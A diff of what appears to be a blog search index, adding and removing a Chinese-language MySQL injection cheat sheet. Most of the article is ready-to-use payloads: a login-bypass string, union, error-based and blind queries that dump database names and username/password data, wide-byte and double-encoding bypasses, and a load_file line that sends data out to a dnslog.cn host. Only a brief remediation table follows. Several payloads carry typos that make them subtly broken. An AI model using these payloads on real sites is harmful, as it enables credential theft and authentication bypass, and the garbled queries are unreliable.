+<pre class="highlight"><span class="line">addslashes(&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(&#x27;&#x27;)</span><br></pre>
+
+<p>上述四条语句组合中，除了</p>
+<p><code>mysql_set_charset(&quot;gbk&quot;)+mysql_real_escape_string(&#39;&#39;)</code>组合，其他组合均存在宽字节注入</p>
+<h3 id="4、二次编码注入"><a href="#4、二次编码注入" class="headerlink" title="4、二次编码注入"></a>4、二次编码注入</h3><p>(单双引号页面无变化)</p>
+<p>注！先转义再解码造成注入，应先解码再转义</p>
+<table>
+<thead>
+<tr>
+<th align="left">正确流程</th>
+<th align="left">错误流程（二次编码注入）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">php自动进行一次url解码 网站二次解码 转义单双引号进行防护 写入数据库</td>
+<td align="left">php自动解码 转义防护 网站二次解码 urldecode()、rawurldecode() 写入数据库</td>
+</tr>
+</tbody></table>
+<p>单引号二次url编码为：%2527</p>
+<p>双引号二次url编码为：%2522</p>
+<p>关键字二次编码：hex转码-前缀加%25（%的url编码）</p>
+<h3 id="5、堆叠注入"><a href="#5、堆叠注入" class="headerlink" title="5、堆叠注入"></a>5、堆叠注入</h3><p>前提：存在sql注入</p>
+<p>截断符后使用分号分割，后面注释，中间插入任意sql语句（多个语句用;分割）</p>
+<p>堆叠注入存在场景</p>
+<table>
+<thead>
+<tr>
+<th align="left">搭配</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">mssql+asp/php/jsp</td>
+<td align="left">堆叠注入</td>
+</tr>
+<tr>
+<td align="left">mysql+php</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">mysql_connect()/mysql_query(“select $id”)</td>
+<td align="left">不能堆叠注入</td>
+</tr>
+<tr>
+<td align="left">mysqli_connect()/mysqli_query(“select $id”)</td>
+<td align="left">不能堆叠注入</td>
+</tr>
+<tr>
+<td align="left">mysqli_connect()/multi_query(“select $id”)</td>
+<td align="left">堆叠注入</td>
+</tr>
+<tr>
+<td align="left">new PDO()/bindvalue(“select ?”) execute($id)</td>
+<td align="left">不能注入</td>
+</tr>
+<tr>
+<td align="left">new PDO()/query(“select $id”)</td>
+<td align="left">堆叠注入</td>
+</tr>
+</tbody></table>
+<h3 id="6、二阶注入"><a href="#6、二阶注入" class="headerlink" title="6、二阶注入"></a>6、二阶注入</h3><p>存储在数据库汇总的数据，在使用时发生的注入</p>
+<p>在注册用户或者发表文章等写入数据库操作时，加入注入语句，被转义存入数据库</p>
+<p>当使用该数据时，被取出，这时注入语句生效</p>
+<p>注意：遇到限制是数字类型或者关键字拦截，可进行十六进制编码</p>
+<h3 id="7、其他："><a href="#7、其他：" class="headerlink" title="7、其他："></a>7、其他：</h3><p>文件上传时，可通过文件名进行sql注入</p>
+<h1 id="六、DNS外带"><a href="#六、DNS外带" class="headerlink" title="六、DNS外带"></a>六、DNS外带</h1><p><strong>前提：</strong></p>
+<p>Windows服务器，secure_file_priv为空（非NULL）</p>
+<p><strong>语句：</strong></p>
+<pre class="highlight"><span class="line">select load_file(concat(&quot;\\\\&quot;,version(),&quot;.1ndex.dnslog.cn\\x&quot;));</span><br></pre>
+
+<h1 id="七、sql注入防护-修复"><a href="#七、sql注入防护-修复" class="headerlink" title="七、sql注入防护/修复"></a>七、sql注入防护/修复</h1><table>
+<thead>
+<tr>
+<th align="left">修复</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">去掉单引号</td>
+<td align="left">现实场景常用单引号，去掉不合实际</td>
+</tr>
+<tr>
+<td align="left">转义单引号</td>
+<td align="left">对数字型无效（数字型不需要引号） 斜杠转义 addslashes()函数转义 php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
+</tr>
+<tr>
+<td align="left">强制类型转换</td>
+<td align="left">针对数字型 intval()</td>
+</tr>
+<tr>
+<td align="left">更改数据库连接方式</td>
+<td align="left">POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
+</tr>
+</tbody></table>
+<p>文件读写</p>
+<table>
+<thead>
+<tr>
+<th>读写</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>读文件</td>
+<td>load_file(‘’)</td>
+</tr>
+<tr>
+<td>写文件</td>
+<td>into  outfile  多行写入，使用单引号，自动添加换行  <br>into  dumpfile  单行写入，不转义</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
       </tags>
   </entry>
   <entry>
@@ -2820,563 +3377,6 @@
       </categories>
       <tags>
         <tag>Nosql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mysql注入</title>
-    <url>/article/Mysql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>端口：3306</p>
-<h1 id="一、SQL注入产生原因"><a href="#一、SQL注入产生原因" class="headerlink" title="一、SQL注入产生原因"></a>一、SQL注入产生原因</h1><p>1、不当的类型处理</p>
-<p>2、不安全的数据库配置</p>
-<p>3、不合理的查询集处理</p>
-<p>4、不当的错误处理</p>
-<p>5、转义字符处理不合适</p>
-<p>6、多个提交处理不当</p>
-<h1 id="二、SQL注入关键条件"><a href="#二、SQL注入关键条件" class="headerlink" title="二、SQL注入关键条件"></a>二、SQL注入关键条件</h1><p>1、用户能控制输入的内容</p>
-<p>2、Web应用能把用户输入的内容带入到数据库中执行</p>
-<p>SQL注入分类</p>
-<table>
-<thead>
-<tr>
-<th align="left">分类</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">根据请求方式分类 （判断注入工具：Burpsuite等）</td>
-<td align="left">GET方式请求注入 POST方式请求注入</td>
-</tr>
-<tr>
-<td align="left">根据注入点参数分类 （判断手法：’、”、\）</td>
-<td align="left">字符型注入 整数型注入 搜索型注入（%’and ‘%’=’ 闭合%）</td>
-</tr>
-<tr>
-<td align="left">根据SQL注入点反馈类型分类（重点） （判断注入payload）</td>
-<td align="left">union类型 基于错误显示 布尔类型 基于时间 其他类型</td>
-</tr>
-<tr>
-<td align="left">根据Web应用的数据库类型分类 （判断注入语句）</td>
-<td align="left">MySQL SQLServer Oracle Access</td>
-</tr>
-</tbody></table>
-<p>基于反馈类型分类注入流程</p>
-<table>
-<thead>
-<tr>
-<th align="left">方式</th>
-<th align="left">选择条件</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">union联合查询</td>
-<td align="left">有显示位</td>
-</tr>
-<tr>
-<td align="left">报错注入</td>
-<td align="left">mysql_error调试未删除，控制报错信息</td>
-</tr>
-<tr>
-<td align="left">bool盲注</td>
-<td align="left">页面没显示位、不报错，只能通过页面是否正常来判断，通常为登录页面</td>
-</tr>
-<tr>
-<td align="left">时间延时盲注</td>
-<td align="left">页面没显示位、不报错，页面都显示正常，只能通过页面响应时间判断</td>
-</tr>
-</tbody></table>
-<p><strong>万能密码</strong></p>
-<pre class="highlight"><span class="line">admin&#x27; or 1=&#x27;1</span><br></pre>
-
-<p>语境</p>
-<pre class="highlight"><span class="line">select * from name = &#x27;admin&#x27; or 1=&#x27;1&#x27; and pass=&#x27;&#x27;;</span><br></pre>
-
-<p>关键：</p>
-<p>使用or进行逻辑判断，构造true语句，使得整个判断语句为true</p>
-<h1 id="三、手工注入流程"><a href="#三、手工注入流程" class="headerlink" title="三、手工注入流程"></a>三、手工注入流程</h1><p>1、判断换是否有注入漏洞，识别注入点类型</p>
-<p>2、获取数据库中的信息</p>
-<p> 获取数据库基本信息（数据库版本、数据库类型、查询列数等）</p>
-<p> 获取数据库库名</p>
-<p> 获取表名</p>
-<p> 获取列名</p>
-<p> 获取用户数据</p>
-<p>3、破解加密数据（数据解密）</p>
-<p>4、提升权限（配合其他漏洞）</p>
-<p>5、内网渗透（配合其他漏洞）</p>
-<h1 id="四、详细过程"><a href="#四、详细过程" class="headerlink" title="四、详细过程"></a>四、详细过程</h1><h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><h3 id="1、判断是否存在注入漏洞"><a href="#1、判断是否存在注入漏洞" class="headerlink" title="1、判断是否存在注入漏洞"></a>1、判断是否存在注入漏洞</h3><p>（需要结合数据情景，判断可能使用的sql语句）</p>
-<p>找与数据库交互的位置，判断动态参数，需要结合burpsuite抓包</p>
-<p>1、参数后加 <code>&#39; &quot; \</code>（全加），判断页面是否异常（\必出异常，不用做后续判断）</p>
-<p>2、若出现异常，则依次尝试修改判断字符，使页面返回正常。返回正常则为字符型注入。</p>
-<p>&gt;&gt;若均未返回正常页面，则尝试2-1(若原数据为1)判断是否为整数型注入。（正常则为整数型注入）</p>
-<p>3、使用使页面报错的字符，后加#（url中需url编码为%23）；若正常则只有该截断字符，不正常继续判断其他截断字符。</p>
-<p>&gt;&gt;再加)#；正常则含有括号，不正常则进行嵌套判断。</p>
-<p>4、以上均没有，则判断特殊注入。二次编码注入、宽字节注入、时间延时盲注等（这些类型注入，使用单双信号页面无变化）。</p>
-<h3 id="2、判断数据库列数"><a href="#2、判断数据库列数" class="headerlink" title="2、判断数据库列数"></a>2、判断数据库列数</h3><p>order by + 数字</p>
-<p>报错则用二分法继续判断，直至正常。精确到正常的临界数字，即为列数。</p>
-<p><code>&#39; order by 5#</code></p>
-<p>修改2为-2，使默认查询语句结果为空，隐去；这样union select结果即可显示。</p>
-<p>然后使用union select联合查,寻找显示位：</p>
-<p><code>id = -2 union select 1,2,3,4；</code></p>
-<h3 id="3、数据库信息查询"><a href="#3、数据库信息查询" class="headerlink" title="3、数据库信息查询"></a>3、数据库信息查询</h3><table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">查库名</td>
-<td align="left"><code>-1 union select 1,2,database()-- a</code> 推荐 <br><code>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</code></td>
-</tr>
-<tr>
-<td align="left">查表名</td>
-<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;数据库名&#39;)-- a</code></td>
-</tr>
-<tr>
-<td align="left">查列名</td>
-<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;)-- a</code></td>
-</tr>
-<tr>
-<td align="left">查数据</td>
-<td align="left"><code>-1 union select 1,2,(select concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)-- a</code></td>
-</tr>
-</tbody></table>
-<p><strong>注意</strong>：</p>
-<p>1、union select查询列数要与前面列数相同</p>
-<p>2、concat()拼接多列结果，group_concat()拼接多行结果。</p>
-<p>如</p>
-<pre class="highlight"><span class="line">SELECT * FROM db_bbs.tb_user UNION SELECT 1,(SELECT group_concat(table_name,&#x27;|&#x27;)FROM information_schema.`TABLES` WHERE TABLES_schema=&#x27;db_bbs&#x27;;),3,4;</span><br></pre>
-
-<p>3、可将查询内容去掉引号，转成16进制形式（前面加上0x）</p>
-<p>4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库</p>
-<p>即</p>
-<pre class="highlight"><span class="line">SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()</span><br></pre>
-
-
-
-<p><strong>数据库常用函数</strong></p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">version()</td>
-<td align="left">数据库版本号</td>
-</tr>
-<tr>
-<td align="left">database()</td>
-<td align="left">当前数据库</td>
-</tr>
-<tr>
-<td align="left">user()</td>
-<td align="left">当前用户</td>
-</tr>
-<tr>
-<td align="left">current_user()</td>
-<td align="left">当前用户名</td>
-</tr>
-<tr>
-<td align="left">system_user()</td>
-<td align="left">系统用户名</td>
-</tr>
-<tr>
-<td align="left">@@datadir</td>
-<td align="left">数据库路径</td>
-</tr>
-<tr>
-<td align="left">@@version_compile_os</td>
-<td align="left">操作系统版本</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th align="left">常用函数</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">limit</td>
-<td align="left">限制查询数量，下标从0开始 limit 0,1 从0开始查两个</td>
-</tr>
-<tr>
-<td align="left">length()</td>
-<td align="left">计算数据长度</td>
-</tr>
-<tr>
-<td align="left">count()</td>
-<td align="left">计算数据行数</td>
-</tr>
-<tr>
-<td align="left">mid(str,1,30)</td>
-<td align="left">截取字符串，从1开始截取30位,紧跟要截取的部分，即数据库名、表名、字段名和数据名</td>
-</tr>
-<tr>
-<td align="left">substr(str,0,30)</td>
-<td align="left">0为截取初始位，包含整个查询语句</td>
-</tr>
-<tr>
-<td align="left">ascii()</td>
-<td align="left">转为ascii码</td>
-</tr>
-</tbody></table>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1、相关函数"><a href="#1、相关函数" class="headerlink" title="1、相关函数"></a>1、相关函数</h3><table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">updatexml(arg1,arg2,arg3) <br>查询符合条件的数据 XPATH路径报错</td>
-<td align="left">and updatexml(1,concat(0x5e,(select user()),0x5e),1)  <br>mysql5.1.5及以上版本，输出有32位长度限制 0x5e为^的16进制编码，用于绕过斜杠转义，下同</td>
-</tr>
-<tr>
-<td align="left">extractvalue(arg1,arg2) <br>同上，两个参数 XPATH路径报错</td>
-<td align="left">and extractvalue(1,concat(0x5e,(select user()),0x5e))  <br>mysql5.1及以上版本,输出有32位长度限制</td>
-</tr>
-<tr>
-<td align="left">floor() <br>返回小于等于该值的最大整数（只返回整数部分） floor、count、group by函数冲突报错</td>
-<td align="left">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)  <br>mysql5.0及以上版本，user()可变，其他固定</td>
-</tr>
-<tr>
-<td align="left">name_const(name,value) <br>产生一个结果集合列 列名重复报错</td>
-<td align="left">and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a  <br>mysql5.0及以下</td>
-</tr>
-<tr>
-<td align="left">exp() 以e为底的指数函数 整形溢出报错</td>
-<td align="left">and exp(~(select * from (select user()) a))  <br>mysql5.5.5及以上版本</td>
-</tr>
-<tr>
-<td align="left">几何函数报错（不满足要求就会报错） <br>geometrycollection() <br>multipoint() <br>polygon() <br>multipolygon() <br>linestring() <br>multilinestring()</td>
-<td align="left">and multipoint((select * from (select * from (select * from (select version())a)b)c))</td>
-</tr>
-</tbody></table>
-<h3 id="2、用法："><a href="#2、用法：" class="headerlink" title="2、用法："></a>2、用法：</h3><p>将对应user()等地方替换为要执行的sql语句即可</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">查数据库名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select database()),0x7e),1)-- a</code> 推荐 <br>或 <br><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)-- a</code></td>
-</tr>
-<tr>
-<td align="left">查表名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)-- a</code></td>
-</tr>
-<tr>
-<td align="left">查列名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)-- a</code></td>
-</tr>
-<tr>
-<td align="left">查数据</td>
-<td align="left"><code>id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)-- a</code></td>
-</tr>
-</tbody></table>
-<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
-<p>1、用法：</p>
-<p>ascii码二分法</p>
-<table>
-<thead>
-<tr>
-<th align="left">说明</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">先判断数据长度或个数</td>
-<td align="left">and length((select database())) &gt; 64</td>
-</tr>
-<tr>
-<td align="left">然后进行二分法匹配</td>
-<td align="left">and ascii(mid((select database()),1,1)) &gt;64</td>
-</tr>
-</tbody></table>
-<p>2、语句（省略二分法，直接用=号）</p>
-<p>n均为前一句获取的长度值</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">获取数据库长度</td>
-<td align="left"><code>and (length(database()))=8</code> <br>注意：判断长度不需要转ascii码</td>
-</tr>
-<tr>
-<td align="left">获取数据库名</td>
-<td align="left"><code>and ascii((select mid(database(),1,1)))=115 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取表长度</td>
-<td align="left"><code>and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取表名</td>
-<td align="left"><code>and ascii((select mid(group_conca(table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取列长度</td>
-<td align="left"><code>and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取列名</td>
-<td align="left"><code>and ascii((select mid(group_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取数据长度</td>
-<td align="left"><code>and length((select group_concat(username) from database().&#39;表名&#39;))=30 -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取数据</td>
-<td align="left"><code>and ascii((select mid(concat(username,0x7e,password),1,1) from database().&#39;表名&#39;))=30 -- a</code></td>
-</tr>
-</tbody></table>
-<h3 id="时间延时盲注"><a href="#时间延时盲注" class="headerlink" title="时间延时盲注"></a>时间延时盲注</h3><p>（单双引号页面无变化）</p>
-<p>基于sql盲注，为升级版本</p>
-<p>使用’”%判断时，页面无任何变化，尝试判断是否存在时间盲注</p>
-<p>1、判断：</p>
-<p><code>&#39; &quot; \</code></p>
-<p><code>&#39;and sleep(3) %23</code></p>
-<p><code>&#39; and sleep(3))%23</code></p>
-<p>…</p>
-<p>方法同判断截断字符</p>
-<p>2、用法：</p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">if</td>
-<td align="left">select if(arg1,arg2,arg3) <br>arg1：判断条件 <br>arg2：条件为真时执行的语句 <br>arg3：条件为假时执行的语句  <br>常用： <br>and select if((length(database())&gt;5),sleep(5),1) –a</td>
-</tr>
-<tr>
-<td align="left">case when</td>
-<td align="left">select case when arg1 then arg2 else arg3 end; <br>arg1：判断条件 <br>arg2：条件为真时执行的语句<br>arg3：条件为假时执行的语句  <br>常用： <br>and select case when ascci(mid(version(),1,1))&gt;64 then sleep(3) end – a</td>
-</tr>
-</tbody></table>
-<p>3、语句如下（省略二分法，直接用=号）</p>
-<table>
-<thead>
-<tr>
-<th align="left">操作</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">获取数据库长度</td>
-<td align="left"><code>and if((length(database()))=8),sleep(3),1)-- a</code> <br>注意：判断长度不需要转ascii码</td>
-</tr>
-<tr>
-<td align="left">获取数据库名</td>
-<td align="left"><code>and if((ascii((select mid(database(),1,1)))=115),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取表长度</td>
-<td align="left"><code>and if((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取表名</td>
-<td align="left"><code>and if((ascii((select mid(group_concat(table_name),1,1) from information_schema.tables where table_schema=database()))=100),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取列长度</td>
-<td align="left"><code>and if((length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取列名</td>
-<td align="left"><code>and if((ascii((select mid(goup_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取数据长度</td>
-<td align="left"><code>and if((length((select group_concat(username) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
-</tr>
-<tr>
-<td align="left">获取字段名</td>
-<td align="left"><code>and if((ascii((select mid(concat(username),1,1) from database().&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
-</tr>
-</tbody></table>
-<p>注： sleep可用benchmark代替</p>
-<p><code>benchmark(arg1,arg2)</code></p>
-<p>arg1为执行次数，arg2为执行语句</p>
-<p>即执行多少次指定语句，返回执行事件，次数500万次起步，基于cpu质量，延时不稳定</p>
-<p>benchmark(5000000,md5(123)) 执行500万次MD5加密</p>
-<p>select if(判断语句,benchmark(5000000,md5(123)),1)</p>
-<h1 id="五、其他注入类型"><a href="#五、其他注入类型" class="headerlink" title="五、其他注入类型"></a>五、其他注入类型</h1><h2 id="1、请求头注入"><a href="#1、请求头注入" class="headerlink" title="1、请求头注入"></a>1、请求头注入</h2><table>
-<thead>
-<tr>
-<th align="left">类型</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">User-Agent</td>
-<td align="left">浏览器版本</td>
-</tr>
-<tr>
-<td align="left">X-Forwarded-For</td>
-<td align="left">获取HTTP请求端的真实IP</td>
-</tr>
-</tbody></table>
-<p>使用Header Editor工具修改请求头，在上述两个值后添加单双引号，保持开启状态即可</p>
-<p>注意，这里的sql语句大概率为insert，所以可用注入为：</p>
-<p>报错注入和bool盲注</p>
-<h3 id="2、内联注入"><a href="#2、内联注入" class="headerlink" title="2、内联注入"></a>2、内联注入</h3><p>留言板界面若是存在注入，可用补齐insert语句参数法，</p>
-<p>找到留言板的显示位，在显示位上进行sql注入。</p>
-<p>这里难点在于插入位数未知、插入类型限制未知，所以位数需要逐个尝试，内容留空。</p>
-<p>使用</p>
-<p>不用注释，用截断代替，然后使用多个and/or连接</p>
-<p>注：前面为true用and；前面为false用or</p>
-<p>1、<code>&#39;firefox&#39; and &#39;</code>补齐</p>
-<p>2、<code>&#39;firefox&#39; and payload and &#39;</code></p>
-<h3 id="3、宽字节注入"><a href="#3、宽字节注入" class="headerlink" title="3、宽字节注入"></a>3、宽字节注入</h3><p>（单双引号页面无变化）</p>
-<p>mysql语句执行时，现将数据转成16进制，再执行</p>
-<p>GBK为两字节编码方式，编码范围为8140-FEFE（81为页数，40位行列）</p>
-<p>ascii为单字节编码，编码范围为00-7F（斜杠的ascii码为5C）</p>
-<p>当字节数小于81时，会被认为是ascii编码，将转码成ascii码形式；</p>
-<p>当字节数在81-FE之间时，会被认为是gbk编码，会连同后一位一起以gbk形式编码。</p>
-<p>形如abcd（ab为ascii转码的数据，cd为gbk转码的数据）</p>
-<p>原本应解码成两个ascii数据（a、b）和一个gbk数据（cd）</p>
-<p>但是若b的数据大于81，则会被认为是gbk编码的数据，会和c一起解码，</p>
-<p>此时就解码成了两个ascii数据（a、d）和一个gbk编码数据（bc）</p>
-<p><strong>用法：</strong></p>
-<p>注意：通常出现在斜杠转义单双引号的网页</p>
-<p>利用：构造?id=1%df’即可</p>
-<p>%df可以为任何hex码在81-FE之间的数据</p>
-<p><strong>宽字节注入存在条件</strong></p>
-<p>PHP+Mysql+GBK</p>
-<p><strong>编码语句：</strong></p>
-<pre class="highlight"><span class="line">mysql_set_charset(&quot;gbk&quot;)</span><br><span class="line"></span><br><span class="line">mysql_query(&quot;set names gbk&quot;)</span><br></pre>
-
-<p>转义语句：</p>
-<pre class="highlight"><span class="line">addslashes(&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(&#x27;&#x27;)</span><br></pre>
-
-<p>上述四条语句组合中，除了</p>
-<p><code>mysql_set_charset(&quot;gbk&quot;)+mysql_real_escape_string(&#39;&#39;)</code>组合，其他组合均存在宽字节注入</p>
-<h3 id="4、二次编码注入"><a href="#4、二次编码注入" class="headerlink" title="4、二次编码注入"></a>4、二次编码注入</h3><p>(单双引号页面无变化)</p>
-<p>注！先转义再解码造成注入，应先解码再转义</p>
-<table>
-<thead>
-<tr>
-<th align="left">正确流程</th>
-<th align="left">错误流程（二次编码注入）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">php自动进行一次url解码 网站二次解码 转义单双引号进行防护 写入数据库</td>
-<td align="left">php自动解码 转义防护 网站二次解码 urldecode()、rawurldecode() 写入数据库</td>
-</tr>
-</tbody></table>
-<p>单引号二次url编码为：%2527</p>
-<p>双引号二次url编码为：%2522</p>
-<p>关键字二次编码：hex转码-前缀加%25（%的url编码）</p>
-<h3 id="5、堆叠注入"><a href="#5、堆叠注入" class="headerlink" title="5、堆叠注入"></a>5、堆叠注入</h3><p>前提：存在sql注入</p>
-<p>截断符后使用分号分割，后面注释，中间插入任意sql语句（多个语句用;分割）</p>
-<p>堆叠注入存在场景</p>
-<table>
-<thead>
-<tr>
-<th align="left">搭配</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">mssql+asp/php/jsp</td>
-<td align="left">堆叠注入</td>
-</tr>
-<tr>
-<td align="left">mysql+php</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">mysql_connect()/mysql_query(“select $id”)</td>
-<td align="left">不能堆叠注入</td>
-</tr>
-<tr>
-<td align="left">mysqli_connect()/mysqli_query(“select $id”)</td>
-<td align="left">不能堆叠注入</td>
-</tr>
-<tr>
-<td align="left">mysqli_connect()/multi_query(“select $id”)</td>
-<td align="left">堆叠注入</td>
-</tr>
-<tr>
-<td align="left">new PDO()/bindvalue(“select ?”) execute($id)</td>
-<td align="left">不能注入</td>
-</tr>
-<tr>
-<td align="left">new PDO()/query(“select $id”)</td>
-<td align="left">堆叠注入</td>
-</tr>
-</tbody></table>
-<h3 id="6、二阶注入"><a href="#6、二阶注入" class="headerlink" title="6、二阶注入"></a>6、二阶注入</h3><p>存储在数据库汇总的数据，在使用时发生的注入</p>
-<p>在注册用户或者发表文章等写入数据库操作时，加入注入语句，被转义存入数据库</p>
-<p>当使用该数据时，被取出，这时注入语句生效</p>
-<p>注意：遇到限制是数字类型或者关键字拦截，可进行十六进制编码</p>
-<h3 id="7、其他："><a href="#7、其他：" class="headerlink" title="7、其他："></a>7、其他：</h3><p>文件上传时，可通过文件名进行sql注入</p>
-<h1 id="六、DNS外带"><a href="#六、DNS外带" class="headerlink" title="六、DNS外带"></a>六、DNS外带</h1><p><strong>前提：</strong></p>
-<p>Windows服务器，secure_file_priv为空（非NULL）</p>
-<p><strong>语句：</strong></p>
-<pre class="highlight"><span class="line">select load_file(concat(&quot;\\\\&quot;,version(),&quot;.1ndex.dnslog.cn\\x&quot;));</span><br></pre>
-
-<h1 id="七、sql注入防护-修复"><a href="#七、sql注入防护-修复" class="headerlink" title="七、sql注入防护/修复"></a>七、sql注入防护/修复</h1><table>
-<thead>
-<tr>
-<th align="left">修复</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">去掉单引号</td>
-<td align="left">现实场景常用单引号，去掉不合实际</td>
-</tr>
-<tr>
-<td align="left">转义单引号</td>
-<td align="left">对数字型无效（数字型不需要引号） 斜杠转义 addslashes()函数转义 php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
-</tr>
-<tr>
-<td align="left">强制类型转换</td>
-<td align="left">针对数字型 intval()</td>
-</tr>
-<tr>
-<td align="left">更改数据库连接方式</td>
-<td align="left">POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
-</tr>
-</tbody></table>
-<p>文件读写</p>
-<table>
-<thead>
-<tr>
-<th>读写</th>
-<th>语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>读文件</td>
-<td>load_file(‘’)</td>
-</tr>
-<tr>
-<td>写文件</td>
-<td>into  outfile  多行写入，使用单引号，自动添加换行  <br>into  dumpfile  单行写入，不转义</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>mysql</tag>
       </tags>
   </entry>
   <entry>
@@ -4420,7 +4420,7 @@
 <td align="left">删除admin所在行，删除限定符必须唯一</td>
 </tr>
 <tr>
-<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#49;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;">&#49;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;</a>](mailto:<a href="mailto:&#49;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;">&#49;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;</a>)’ WHERE uname=’admin’; “);</td>
